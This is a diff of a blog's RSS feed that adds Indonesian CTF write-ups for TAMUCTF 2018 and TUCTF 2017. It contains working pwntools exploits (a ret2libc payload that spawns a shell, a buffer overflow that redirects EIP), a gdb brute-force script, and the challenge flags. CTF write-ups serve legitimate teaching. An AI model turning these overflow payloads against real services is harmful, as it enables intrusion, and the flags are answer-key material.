+    &lt;a href=&quot;#&quot; class=&quot;close&quot;&gt;close&lt;/a&gt;
+    &lt;a href=&quot;#&quot; class=&quot;minimize&quot;&gt;minimize&lt;/a&gt;
+    &lt;a href=&quot;#&quot; class=&quot;deactivate&quot;&gt;deactivate&lt;/a&gt;
+  &lt;/nav&gt;
+  &lt;h3 class=&quot;title&quot;&gt;Terminal&lt;/h3&gt;
+  &lt;pre&gt;
+&lt;span class=&quot;command&quot;&gt;file pwn4&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;pwn4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=10072c7ad444bfe87517d96dbe040fb69cf67cd4, not stripped&lt;/span&gt;
+&lt;span class=&quot;command&quot;&gt;checksec pwn4&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;[*] &amp;#39;/media/pwning/dev_urandom/CTF 2017/TAMUCTF 2018/pwn/pwn4&amp;#39;&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;Arch:     i386-32-little&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;RELRO:    Partial RELRO&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;Stack:    No canary found&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;NX:       NX enabled&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;PIE:      No PIE (0x8048000)&lt;/span&gt;
+  &lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Pada pwn4 menggunakan teknik &lt;code class=&quot;highlighter-rouge&quot;&gt;Ret2Libc&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Payload adalah sebagai berikut :&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Pattern +  function_addr + return_address + function_argument
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Pada pwn4 payload seperti berikut :&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 32 +  system_addr + &lt;span class=&quot;s2&quot;&gt;&quot;JUNK&quot;&lt;/span&gt; + sh_string
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;sh_string adalah string &lt;code class=&quot;highlighter-rouge&quot;&gt;sh&lt;/code&gt; didapatkan dari menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;find &lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;
+Searching &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sh'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;: None ranges
+Found 99 results, display max 99 items:
+      ....
+      pwn4 : 0x804a03d --&amp;gt; 0x60006873 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sh'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+      ....
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Pada bagian return address diisi dengan &lt;code class=&quot;highlighter-rouge&quot;&gt;JUNK&lt;/code&gt; karena memang diperlukan apabila sudah mendapatkan interactive shell.&lt;/p&gt;
+
+&lt;p&gt;Dan system_addr adalah fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;pdisass cal
+Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;cal:
+   0x080485b2 &amp;lt;+14&amp;gt;:    call   0x8048430 &amp;lt;system@plt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Berikut exploit code nya&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;sh_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x804a03d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8048430&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pwn.ctf.tamu.edu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4324&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;JUNK&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_string&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Input&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;flag--gigemb4ck707h3l1br4ry&quot;&gt;Flag : gigem{b4ck_70_7h3_l1br4ry}&lt;/h3&gt;
+
+&lt;h1 id=&quot;pwn5&quot;&gt;Pwn5&lt;/h1&gt;
+</description>
+        <pubDate>Tue, 27 Feb 2018 00:00:00 +0700</pubDate>
+        <link>https://rhama.my.id/ctf/2018/02/27/tamuctf-2018-pwning.html</link>
+        <guid isPermaLink="true">https://rhama.my.id/ctf/2018/02/27/tamuctf-2018-pwning.html</guid>
+        
+        <category>TAMUCTF-2018</category>
+        
+        <category>CTF</category>
+        
+        
+        <category>CTF</category>
+        
+      </item>
+    
+      <item>
         <title>TPCTF 2017 - Write up</title>
-        <description>
+        <description>&lt;div class=&quot;terminal&quot;&gt;
+  &lt;nav&gt;
+    &lt;a href=&quot;#&quot; class=&quot;close&quot;&gt;close&lt;/a&gt;
+    &lt;a href=&quot;#&quot; class=&quot;minimize&quot;&gt;minimize&lt;/a&gt;
+    &lt;a href=&quot;#&quot; class=&quot;deactivate&quot;&gt;deactivate&lt;/a&gt;
+  &lt;/nav&gt;
+  &lt;h3 class=&quot;title&quot;&gt;Terminal&lt;/h3&gt;
+&lt;pre&gt;&lt;span class=&quot;command&quot;&gt;echo &amp;quot;Hello world!&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;Hello world&lt;/span&gt;
+&lt;span class=&quot;command&quot;&gt;date&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;Sun Dec 14 09:56:26 CET 2014&lt;/span&gt;&lt;/pre&gt;
+&lt;/div&gt;
 </description>
         <pubDate>Tue, 05 Dec 2017 00:00:00 +0700</pubDate>
         <link>https://rhama.my.id/2017/12/05/tpctf-2017-write-up.html</link>
@@ -693,6 +1016,219 @@ easy_peasy: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&qu
       </item>
     
       <item>
+        <title>TUCTF 2017 - Writeup</title>
+        <description>&lt;h2 id=&quot;reversing-200-unknown&quot;&gt;Reversing 200 (Unknown)&lt;/h2&gt;
+
+&lt;p&gt;Diberikan file ELF 64 bit stripped.&lt;/p&gt;
+
+&lt;p&gt;Berikut hasil disassembly fungsi main&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;signed __int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  signed __int64 result; // rax@2
+  unsigned int i; // [sp+14h] [bp-Ch]@5
+  char *v5; // [sp+18h] [bp-8h]@5
+
+  if ( a1 == 2 )
+  {
+    if ( strlen(a2[1]) == 56 )
+    {
+      v5 = a2[1];
+      for ( i = 0; i &amp;lt; 0x38; ++i )
+      {
+        if ( (unsigned int)sub_401E90((__int64)v5, i) )
+          dword_603084 = 1;
+      }
+      if ( dword_603084 )
+        puts(&quot;Nope.&quot;);
+      else
+        printf(&quot;Congraz the flag is: %s\n&quot;, v5, a2);
+      result = 0LL;
+    }
+    else
+    {
+      puts(&quot;Still nope.&quot;);
+      result = 4294967294LL;
+    }
+  }
+  else
+  {
+    puts(&quot;Try again.&quot;);
+    result = 0xFFFFFFFFLL;
+  }
+  return result;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Dari Pseudo-C diatas diketahui program membutuhkan &lt;code class=&quot;highlighter-rouge&quot;&gt;args&lt;/code&gt; dan panjang nya &lt;code class=&quot;highlighter-rouge&quot;&gt;56 bytes&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;sub_401E90&lt;/code&gt; akan memproses inputan, dan inputan di proses byte per byte hingga 56, dan &lt;code class=&quot;highlighter-rouge&quot;&gt;dword_603084&lt;/code&gt; adalah global variable yang di set ke nilai &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;for ( i = 0; i &amp;lt; 0x38; ++i )
+      {
+        if ( (unsigned int)sub_401E90((__int64)v5, i) )
+          dword_603084 = 1;
+      }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;saat mencoba membaca hasil Pseodo-C fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;sub_401E90&lt;/code&gt;, saya sama sekali tidak mengerti proses apaan itu *ribet :v karena banyak fungsi-fungsi lain yang dipanggil lagi.&lt;/p&gt;
+
+&lt;p&gt;Percobaan debug menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;, yang dimana nilai hasil proses fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;sub_401E90&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt; akan bernilai &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0&lt;/code&gt; apabila byte inputan benar, dan  akan bernilai &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1&lt;/code&gt; apabila byte inputan salah.&lt;/p&gt;
+
+&lt;p&gt;Snippet decompile&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;   0x401c7d:	call   0x401e90
+   0x401c82:	test   eax,eax
+   0x401c84:	je     0x401c90
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;gdb-peda$ b *0x0000000000401c82
+Breakpoint 1 at 0x401c82
+gdb-peda$ r TUCTF{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+gdb-peda$ p/x $rax
+$3 = 0x0
+gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+gdb-peda$ p/x $rax
+$3 = 0x1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Karena inputan di proses, byte-per-byte, saya mencoba input dengan prefix “TUCTF{“ sehingga nilai &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt; akan bernilai &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0&lt;/code&gt; dalam 6 kali iterasi, dan selanjutkan &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt; akan bernilai &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1&lt;/code&gt; karena &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;A&quot;*50&lt;/code&gt; bukan byte-byte yang benar. Dari sini kita bisa melakukan &lt;em&gt;Brute Force&lt;/em&gt; setiap kemungkinan byte yang benar.&lt;/p&gt;
+
+&lt;p&gt;Berikut script yang saya gunakan untuk melakukan brute force&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;gdb&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_letters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;!_}&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;TUCTF{&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;b *0x0000000000401c82&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;p/x $rax&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0x0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		 	&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
+		 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;}&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		 		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Flag : &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+		 		&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		 	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Curret Flag : &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+		 	&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		 	&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Pattern : &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Nilai Rax : &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;	
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;gdb -x unk.py -q unknown --nh --batch
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Setelah menunggu beberapa lama, akan mendapatkan Flag&lt;/p&gt;
+
+&lt;h3 id=&quot;flag--tuctfw3lc0m3707uc7f4nd7h4nky0uf0rp4r71c1p471n6&quot;&gt;Flag : TUCTF{w3lc0m3_70_7uc7f_4nd_7h4nk_y0u_f0r_p4r71c1p471n6!}&lt;/h3&gt;
+
+&lt;h2 id=&quot;pwn-50-vuln-chat&quot;&gt;Pwn 50 (Vuln-chat)&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;Classic Buffer Overflow&lt;/em&gt; yang dimana meng overwrite &lt;em&gt;Local Variable&lt;/em&gt; dengan “%s” agar pada bagian form “Enter your username” tidak dibatasi dan bisa meoverwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt; dan arahkan ke fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;printFlag&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Berikut script yang saya gunakan.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;vulnchat.tuctf.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00007325&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# overwrite with &quot;%s&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter your username: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x804856b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
